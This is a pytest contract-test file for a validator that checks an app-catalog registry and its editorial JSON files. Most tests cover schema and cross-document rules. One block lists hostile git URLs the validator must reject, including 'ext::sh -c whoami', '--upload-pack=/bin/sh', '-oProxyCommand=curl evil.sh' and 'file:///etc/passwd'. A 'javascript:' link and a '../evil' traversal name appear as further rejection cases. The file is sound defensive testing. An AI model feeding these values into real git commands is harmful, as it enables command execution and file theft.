"""Contract tests: prove the gate REJECTS what it is supposed to reject.

A validator that only ever runs against a valid catalog tells you nothing --
it would pass just as happily with every check deleted. So each case below is
a mistake someone could plausibly make, paired with the specific reason the
contract refuses it. The accept cases exist to keep the gate from becoming so
strict that legitimate input fails.

Run: pytest tests/ -q
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

from validate import validate  # noqa: E402

SCHEMA_DIR = ROOT / "schema"


def write_pair(tmp_path: Path, registry: dict, editorial: dict) -> tuple[Path, Path]:
    reg = tmp_path / "official-registry.json"
    ed = tmp_path / "editorial.json"
    reg.write_text(json.dumps(registry), encoding="utf-8")
    ed.write_text(json.dumps(editorial), encoding="utf-8")
    return reg, ed


def app(name: str = "demo-app", ref: str = "main") -> dict:
    return {"name": name, "source": {"type": "git", "url": "https://example.com/a.git", "ref": ref}}


def base_registry(*apps: dict, **extra) -> dict:
    return {"schemaVersion": 1, "apps": list(apps), **extra}


def base_editorial(**extra) -> dict:
    return {"schemaVersion": 1, **extra}


def errors_for(tmp_path: Path, registry: dict, editorial: dict) -> list[str]:
    reg, ed = write_pair(tmp_path, registry, editorial)
    return validate(reg, ed).errors


# --------------------------------------------------------------------------
# Accept: legitimate input must not be rejected.
# --------------------------------------------------------------------------


def test_accepts_empty_catalog(tmp_path):
    """The catalog starts empty. An empty registry is publishable, not an error."""
    assert errors_for(tmp_path, base_registry(), base_editorial(categories=[])) == []


def test_accepts_branch_ref_in_authored_input(tmp_path):
    """A curator writes a branch; pinning to a commit is the pipeline's job."""
    assert errors_for(tmp_path, base_registry(app(ref="main")), base_editorial()) == []


def test_accepts_app_with_category_membership(tmp_path):
    registry = base_registry(app("demo-app"))
    editorial = base_editorial(
        categories=[{"id": "developer-tools", "label": "Developer Tools", "order": 10, "appRefs": ["demo-app"]}]
    )
    assert errors_for(tmp_path, registry, editorial) == []


def test_accepts_same_app_in_category_and_rail(tmp_path):
    """A rail is how an app appears twice WITHOUT multi-category membership."""
    registry = base_registry(app("demo-app"))
    editorial = base_editorial(
        categories=[{"id": "productivity", "label": "Productivity", "order": 10, "appRefs": ["demo-app"]}],
        sections=[{"type": "rail", "title": "Staff picks", "appRefs": ["demo-app"]}],
    )
    assert errors_for(tmp_path, registry, editorial) == []


def test_uncategorized_app_warns_but_does_not_fail(tmp_path):
    """An app in no category lands in the default bucket; it is never hidden."""
    reg, ed = write_pair(tmp_path, base_registry(app("demo-app")), base_editorial(categories=[]))
    findings = validate(reg, ed)
    assert findings.ok
    assert any("default bucket" in w for w in findings.warnings)


# --------------------------------------------------------------------------
# Reject: authored input must not carry generated or moved-out fields.
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "field,value",
    [
        ("displayName", "Demo"),   # generated from app.json at publish
        ("summary", "A demo"),     # generated
        ("tags", ["dev"]),         # generated
        ("searchAliases", ["d"]),  # generated
        ("version", "1.0.0"),      # generated
        ("category", "dev-tools"), # moved to editorial.json
        ("resources", {"cpu": 1}), # moved to app.json
        ("lifecycle", {"a": 1}),   # moved to app.json
        ("detectInstalled", "x"),  # moved to app.json (now platform.externalInstall)
        ("delegates", []),         # removed entirely: a fetched doc adds no fetch targets
    ],
)
def test_rejects_field_that_is_not_curator_authored(tmp_path, field, value):
    entry = app()
    entry[field] = value
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_accepts_curator_stated_author(tmp_path):
    """`author` is the deliberate exception to "everything displayed is generated".

    It is an assertion about provenance rather than a description of the app, and
    this document is signed by us -- so a manifest's self-claim cannot be the
    last word on it. Withholding it from the curator protected nothing anyway:
    whoever edits this file holds the signing key.
    """
    entry = app()
    entry["author"] = {"name": "LaunchDarkly Labs", "kind": "org"}
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) == []


@pytest.mark.parametrize(
    "value",
    [
        "LaunchDarkly Labs",              # bare string: the published shape is an object
        {},                               # name is required
        {"name": ""},                     # empty name
        {"name": "x", "url": "http://a"}, # https only
        {"name": "x", "kind": "robot"},   # person | org
        {"name": "x", "email": "a@b.c"},  # additionalProperties: false
    ],
)
def test_rejects_a_malformed_curator_author(tmp_path, value):
    entry = app()
    entry["author"] = value
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_rejects_traversing_app_name(tmp_path):
    """A name reaches a filesystem path; '../' must never survive validation."""
    assert errors_for(tmp_path, base_registry(app("../evil")), base_editorial()) != []


def test_rejects_unknown_source_type(tmp_path):
    """Only git is implemented in v1; an unknown transport fails closed."""
    entry = {"name": "demo-app", "source": {"type": "ftp", "url": "ftp://x/a"}}
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_rejects_duplicate_app_name(tmp_path):
    """Two entries with one name make the winning source depend on merge order."""
    assert errors_for(tmp_path, base_registry(app("demo-app"), app("demo-app")), base_editorial()) != []


# --------------------------------------------------------------------------
# Reject: cross-document invariants.
# --------------------------------------------------------------------------


def test_rejects_dangling_app_ref(tmp_path):
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["ghost-app"]}]
    )
    assert any("not declared" in e for e in errors_for(tmp_path, base_registry(), editorial))


def test_rejects_app_in_two_categories(tmp_path):
    registry = base_registry(app("demo-app"))
    editorial = base_editorial(
        categories=[
            {"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app"]},
            {"id": "ops", "label": "Ops", "order": 20, "appRefs": ["demo-app"]},
        ]
    )
    assert any("single-valued" in e for e in errors_for(tmp_path, registry, editorial))


def test_rejects_duplicate_category_order(tmp_path):
    editorial = base_editorial(
        categories=[
            {"id": "dev", "label": "Dev", "order": 10},
            {"id": "ops", "label": "Ops", "order": 10},
        ]
    )
    assert any("unique" in e for e in errors_for(tmp_path, base_registry(), editorial))


def test_rejects_duplicate_category_id(tmp_path):
    """Two categories sharing an id make membership ambiguous.

    Found by mutation testing: this check could be deleted with the suite
    still green.
    """
    editorial = base_editorial(
        categories=[
            {"id": "dev", "label": "Dev", "order": 10},
            {"id": "dev", "label": "Dev Tools", "order": 20},
        ]
    )
    assert any("declared 2 times" in e for e in errors_for(tmp_path, base_registry(), editorial))


def test_rejects_reference_to_tombstoned_app(tmp_path):
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "2026-01-01"}],
    )
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app"]}]
    )
    assert any("tombstoned" in e for e in errors_for(tmp_path, registry, editorial))


def test_rejects_reinstatement_without_tombstone(tmp_path):
    """Silent no-op otherwise: nothing would signal the name was wrong."""
    registry = base_registry(app("demo-app"), reinstated=[{"name": "demo-app", "since": "2026-01-01"}])
    assert any("no matching tombstone" in e for e in errors_for(tmp_path, registry, base_editorial()))


def test_reinstated_app_may_be_referenced_again(tmp_path):
    """A newer reinstatement clears the tombstone, so the app is live again.

    Both lists are append-only history, so the removal record legitimately
    remains; treating `removed` as the answer would keep the app dead forever.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "2026-01-01"}],
        reinstated=[{"name": "demo-app", "since": "2026-06-01"}],
    )
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app"]}]
    )
    assert errors_for(tmp_path, registry, editorial) == []


def test_removal_newer_than_reinstatement_still_tombstoned(tmp_path):
    """Removed again after a reinstatement: the newest record wins."""
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "2026-06-01"}],
    )
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app"]}]
    )
    assert any("tombstoned" in e for e in errors_for(tmp_path, registry, editorial))


def test_same_day_reinstatement_fails_closed(tmp_path):
    """An ambiguous same-day pair keeps the app removed.

    The removal may exist because the app was pulled for cause, so the safe
    reading of a tie is 'still removed'.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "malicious", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "2026-07-01"}],
    )
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app"]}]
    )
    assert any("tombstoned" in e for e in errors_for(tmp_path, registry, editorial))


def test_rejects_non_https_cta(tmp_path):
    """A curated feed must not be able to point the client at other schemes."""
    editorial = base_editorial(
        sections=[{"type": "banner", "md": "hi", "cta": {"label": "Go", "href": "javascript:alert(1)"}}]
    )
    assert errors_for(tmp_path, base_registry(), editorial) != []


# --------------------------------------------------------------------------
# The published wire schema is stricter than the authored one.
# --------------------------------------------------------------------------


def published_errors(doc: dict) -> list[str]:
    from jsonschema import Draft202012Validator

    schema = json.loads((SCHEMA_DIR / "official-registry.schema.json").read_text())
    return [e.message for e in Draft202012Validator(schema).iter_errors(doc)]


def test_published_schema_rejects_mutable_ref():
    """A signed index naming 'main' signs nothing about the bytes."""
    assert published_errors({"schemaVersion": 1, "apps": [app(ref="main")]}) != []


def test_published_schema_accepts_commit_ref():
    assert published_errors({"schemaVersion": 1, "apps": [app(ref="a" * 40)]}) == []


def test_published_schema_rejects_bare_string_author():
    """author is a struct; a bare string cannot carry a URL or person/org kind."""
    entry = app(ref="a" * 40)
    entry["author"] = "kirocrew"
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


def test_published_schema_rejects_digestless_archive():
    """An archive with no digest is an unpinned download."""
    entry = {"name": "demo-app", "source": {"type": "archive", "url": "https://x/a.tgz"}}
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


def test_published_schema_rejects_mixed_source_variants():
    entry = {
        "name": "demo-app",
        "source": {"type": "git", "url": "https://x/a.git", "ref": "a" * 40, "sha256": "b" * 64},
    }
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


# --------------------------------------------------------------------------
# Regressions found while self-reviewing this contract. Each of these passed
# schema validation at some point and was still wrong.
# --------------------------------------------------------------------------


def test_rejects_non_iso_tombstone_date(tmp_path):
    """`format` is only checked when a FormatChecker is wired in.

    Without one, jsonschema treats `format` as an annotation and "NOT-A-DATE"
    validates cleanly -- then flows into date comparison.

    Asserts the SCHEMA-layer message specifically. A bare `errors != []` would
    pass even with the format checker removed, because the cross-document layer
    catches the same bad date independently -- so the weaker assertion cannot
    tell which layer fired, and the format wiring could be deleted unnoticed.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "withdrawn", "since": "NOT-A-DATE"}],
    )
    errors = errors_for(tmp_path, registry, base_editorial())
    assert any("is not a 'date'" in e for e in errors), (
        f"expected a schema-level date format error; got {errors}"
    )


def test_bogus_reinstatement_date_is_rejected(tmp_path):
    """Regression: a lexical string compare let "9999-99-99" outrank any real date.

    That turned an unparseable value into a way to resurrect an app pulled for
    being malicious. Now the schema's date format check rejects the document
    outright, so it never reaches resolution at all.
    """
    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "malicious", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "9999-99-99"}],
    )
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app"]}]
    )
    assert errors_for(tmp_path, registry, editorial) != []


def test_cross_document_layer_fails_closed_on_a_bogus_date():
    """Defense in depth for the same bug, one layer down.

    check_cross_document is reachable without the schema gate (the examples
    test calls it directly, and a future schema loosening would expose it), so
    it must not depend on the schema having already screened the input: an
    unparseable date is an error AND leaves the app tombstoned.
    """
    from validate import Findings, check_cross_document

    registry = base_registry(
        app("demo-app"),
        removed=[{"name": "demo-app", "reason": "malicious", "since": "2026-07-01"}],
        reinstated=[{"name": "demo-app", "since": "9999-99-99"}],
    )
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app"]}]
    )
    findings = Findings()
    check_cross_document(registry, editorial, findings)

    assert any("invalid 'since'" in e for e in findings.errors)
    # The important half: the app must not have gone live.
    assert any("tombstoned" in e for e in findings.errors)


def test_format_checkers_for_every_format_we_use_are_active():
    """Guard against a silently weaker gate.

    `date-time` and `uri` need jsonschema's [format] extra. If the extra is
    ever dropped from requirements, those checks vanish with no error and the
    suite would otherwise stay green while enforcing less.
    """
    import re

    from jsonschema import FormatChecker

    used = set()
    for schema_file in SCHEMA_DIR.glob("*.json"):
        used |= set(re.findall(r'"format":\s*"([a-z0-9-]+)"', schema_file.read_text()))

    missing = sorted(used - set(FormatChecker().checkers))
    assert not missing, (
        f"schemas use format(s) {missing} that this environment does not check; "
        f"install jsonschema[format] (see tools/requirements.txt)"
    )

# --------------------------------------------------------------------------
# Review findings (buluoray, PR #1). Each of these validated cleanly before.
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c whoami",              # git's ext transport executes the command
        "file:///etc/passwd",             # reads an arbitrary local path
        "--upload-pack=/bin/sh",          # argument injection into the git invocation
        "-oProxyCommand=curl evil.sh",    # same, via a leading dash
        "git@github.com:acme/app.git",    # ssh: no tier supplies clone credentials
        "http://github.com/acme/app.git", # plaintext
        "https://exa mple.com/a.git",     # whitespace
    ],
)
def test_rejects_non_https_git_url(tmp_path, url):
    """A git URL is an execution vector once it reaches `git clone`.

    The schema's own preamble forbids carrying executable strings, so leaving
    this field at `minLength: 1` contradicted it -- and the trusted-host gate
    that was supposed to cover it lives in a client that does not exist yet.
    """
    entry = {"name": "demo-app", "source": {"type": "git", "url": url, "ref": "main"}}
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != [], url


def test_published_schema_also_rejects_non_https_git_url():
    entry = {"name": "demo-app", "source": {"type": "git", "url": "ext::sh -c id", "ref": "a" * 40}}
    assert published_errors({"schemaVersion": 1, "apps": [entry]}) != []


def test_published_schema_rejects_bare_array():
    """The legacy bare-array branch was removed.

    It could not carry schemaVersion (so version gating was unenforceable) nor
    removed/reinstated (so tombstones silently did not exist in that shape), and
    it did not match any format that ever existed on disk anyway.
    """
    assert published_errors([]) != []
    assert published_errors([{"name": "demo-app", "source": {"type": "git", "url": "https://x/a.git", "ref": "a" * 40}}]) != []


def test_rejects_empty_subdir(tmp_path):
    """Omit the field rather than passing "" -- an empty segment is not a path."""
    entry = {
        "name": "demo-app",
        "source": {"type": "git", "url": "https://x/a.git", "ref": "main", "subdir": ""},
    }
    assert errors_for(tmp_path, base_registry(entry), base_editorial()) != []


def test_requires_category_order(tmp_path):
    """Without an order a category has no defined placement.

    Uniqueness can only be checked among values that are present, so an
    order-less category would land wherever array position put it.
    """
    editorial = base_editorial(categories=[{"id": "dev", "label": "Dev"}])
    assert errors_for(tmp_path, base_registry(), editorial) != []


def test_duplicate_ref_in_one_category_reports_that_not_two_categories(tmp_path):
    """"in categories 'a' and 'a'" reads as nonsense; it is a distinct mistake."""
    registry = base_registry(app("demo-app"))
    editorial = base_editorial(
        categories=[{"id": "dev", "label": "Dev", "order": 10, "appRefs": ["demo-app", "demo-app"]}]
    )
    errors = errors_for(tmp_path, registry, editorial)
    assert any("listed twice in category 'dev'" in e for e in errors), errors


def _strip_annotations(node):
    """Drop human-facing text so only the semantic shape is compared."""
    if isinstance(node, dict):
        return {
            k: _strip_annotations(v)
            for k, v in node.items()
            if k not in ("description", "title")
        }
    if isinstance(node, list):
        return [_strip_annotations(x) for x in node]
    return node


def test_shared_defs_stay_in_lockstep():
    """`tombstone`, `reinstatement` and `appName` are duplicated across both
    registry schemas. Nothing else pins them together, so extending an enum in
    one file only would let an authored document validate here and then be
    invalid as published output -- with no test turning red.
    """
    authored = json.loads((SCHEMA_DIR / "authored-registry.schema.json").read_text())["$defs"]
    published = json.loads((SCHEMA_DIR / "official-registry.schema.json").read_text())["$defs"]
    for shared in ("tombstone", "reinstatement", "appName"):
        assert _strip_annotations(authored[shared]) == _strip_annotations(published[shared]), (
            f"$defs/{shared} drifted between the authored and published schemas"
        )


# --------------------------------------------------------------------------
# The worked examples double as accept-path coverage. They are a matched pair
# (the editorial one references the registry one), so they also exercise the
# cross-document checks against a realistic non-empty catalog -- every other
# case above uses a two-line synthetic one.
# --------------------------------------------------------------------------

EXAMPLES = ROOT / "examples" / "accept"


def load_example(name: str) -> dict:
    return json.loads((EXAMPLES / name).read_text(encoding="utf-8"))


def test_published_example_is_valid():
    assert published_errors(load_example("official-registry.full.json")) == []


def test_editorial_example_is_valid():
    from jsonschema import Draft202012Validator

    schema = json.loads((SCHEMA_DIR / "editorial.schema.json").read_text())
    doc = load_example("editorial.full.json")
    assert [e.message for e in Draft202012Validator(schema).iter_errors(doc)] == []


def test_examples_are_a_consistent_pair():
    """Every app the editorial example references must exist in the registry example.

    Uses the cross-document checker directly: the published example carries
    generated fields, so it cannot go through validate(), which holds authored
    input to the stricter authored schema.
    """
    from validate import Findings, check_cross_document

    findings = Findings()
    check_cross_document(
        load_example("official-registry.full.json"),
        load_example("editorial.full.json"),
        findings,
    )
    assert findings.errors == []
